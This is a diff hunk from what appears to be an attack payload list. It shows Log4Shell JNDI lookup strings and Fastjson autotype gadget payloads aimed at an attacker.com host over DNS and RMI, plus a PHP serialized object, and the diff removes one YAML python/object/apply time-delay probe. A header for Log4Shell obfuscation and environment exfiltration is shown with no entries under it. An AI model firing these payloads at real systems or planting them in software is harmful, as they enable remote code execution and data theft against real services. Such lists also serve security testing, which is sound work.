@@ -147,7 +147,6 @@ ${jndi:dns://attacker.com/probe}
 {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
 {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://attacker.com:1099/exploit"}
 O:8:"stdClass":1:{s:4:"test";s:4:"test";}
-!!python/object/apply:time.sleep [3]
 
 # ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
 # Log4Shell modern obfuscation + env exfil
